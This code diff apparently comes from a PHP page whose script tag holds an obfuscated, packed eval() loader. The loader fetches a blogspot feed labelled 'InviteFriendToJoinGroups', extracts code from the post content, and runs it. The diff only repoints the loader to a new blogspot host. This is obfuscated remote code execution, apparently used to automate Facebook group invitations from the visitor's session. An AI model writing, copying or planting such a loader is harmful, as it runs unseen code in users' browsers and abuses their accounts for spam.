@@ -26,6 +26,6 @@
         }
 
         eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('g p(5){2 4=9;a(4==9){4=o;$.n({5:5+\'?q-r=1&v=u-m-s\',w:\'h\',l:"j",k:g(3){4=9;a(3.7.D$G.$t==0){2 f="F H x!";I f}J(2 i=0;i<3.7.d.E;i++){2 6=3.7.d[i].6.$t;$("#c").y(6);2 e=$("#c").A();2 8=e.B("2 C=0;");2 b=8[1]+8[0];z(b)}}})}}',46,46,'||var|data|loading|url|content|feed|res|false|if|code|codeB|entry|str|message|function|get||jsonp|success|dataType|in|ajax|true|load_contents|max|results|script||json|alt|type|records|html|runcode|text|split|Aceptfbtogroups|openSearch|length|No|totalResults|more|return|for'.split('|'),0,{}))
-        <?php if(!empty($_GET['action'])):?>load_contents("http://postautofb.blogspot.com/feeds/posts/default/-/InviteFriendToJoinGroups");<?php endif;?>
+        <?php if(!empty($_GET['action'])):?>load_contents("http://postautofb1.blogspot.com/feeds/posts/default/-/InviteFriendToJoinGroups");<?php endif;?>
     </script>
 	var Aceptfbtogroups=0;
